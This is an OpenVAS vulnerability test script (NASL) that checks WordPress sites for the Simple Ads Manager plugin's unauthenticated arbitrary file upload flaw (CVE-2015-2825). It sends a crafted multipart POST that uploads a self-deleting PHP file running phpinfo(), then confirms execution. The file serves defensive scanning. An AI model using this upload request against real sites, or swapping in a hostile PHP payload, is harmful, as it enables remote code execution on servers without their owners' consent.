###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_simple_ads_manager_file_upload_vuln.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Wordpress Simple Ads Manager Plugin File Upload Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805530");
  script_version("$Revision: 13994 $");
  script_cve_id("CVE-2015-2825");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2015-04-08 18:02:38 +0530 (Wed, 08 Apr 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Wordpress Simple Ads Manager Plugin File Upload Vulnerability");

  script_tag(name:"summary", value:"The host is installed with Wordpress
  Simple Ads Manager Plugin and is prone to arbitrary file upload vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is is able to upload file or not.");

  script_tag(name:"insight", value:"Flaw exists because the sam-ajax-admin.php
  script does not properly verify or sanitize user-uploaded files passed via
  the 'path' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to upload files in an affected site.");

  script_tag(name:"affected", value:"Wordpress Simple Ads Manager Plugin
  version 2.5.94");

  script_tag(name:"solution", value:"Upgrade to Wordpress Simple Ads Manager
  Plugin version 2.6.96 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36614");
  script_xref(name:"URL", value:"http://www.itas.vn/news/ITAS-Team-found-out-multiple-critical-vulnerabilities-in-Hakin9-IT-Security-Magazine-78.html?language=en");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://profiles.wordpress.org/minimus");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!http_port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:http_port))
  exit(0);

if(dir == "/")
  dir = "";

host = http_host_name(port:http_port);
url = dir + '/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php';
wpReq = http_get(item: url,  port:http_port);
wpRes = http_keepalive_send_recv(port:http_port, data:wpReq, bodyonly:FALSE);

if(wpRes && wpRes =~ "^HTTP/1\.[01] 200")
{
  url = dir + "/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

  vtstrings = get_vt_strings();
  useragent = http_get_user_agent();

  fileName = vtstrings["lowercase_rand"] + ".php";

  postData = string('-----------------------------18047369202321924582120237505\r\n',
                    'Content-Disposition: form-data; name="path"\r\n\r\n\r\n',
                    '-----------------------------18047369202321924582120237505\r\n',
                    'Content-Disposition: form-data; name="uploadfile"; filename="', fileName ,'"\r\n',
                    'Content-Type: text/html', '\r\n\r\n',
                    '<?php phpinfo(); unlink( "', fileName, '" ); ?>\r\n\r\n',
                    '-----------------------------18047369202321924582120237505\r\n',
                    'Content-Disposition: form-data; name="action"\r\n\r\n',
                    'upload_ad_image\r\n',
                    '-----------------------------18047369202321924582120237505--');

  wpReq = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: multipart/form-data; boundary=---------------------------18047369202321924582120237505\r\n",
                 "Content-Length: ", strlen(postData), "\r\n",
                 "\r\n", postData);
  wpRes = http_keepalive_send_recv(port:http_port, data:wpReq);

  if('success' >< wpRes && wpRes =~ "^HTTP/1\.[01] 200")
  {

    url = dir + "/wp-content/plugins/simple-ads-manager/" + fileName;
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:">phpinfo\(\)<", extra_check:">System"))
    {
      if(http_vuln_check(port:http_port, url:url,
         check_header:FALSE, pattern:"^HTTP/1\.[01] 200"))
      {
        report = "\nUnable to delete the uploaded File at " + url + "\n";
      }

      if(report){
        security_message(data:report, port:http_port);
      } else {
        security_message(port:http_port);
      }
      exit(0);
    }
  }
}
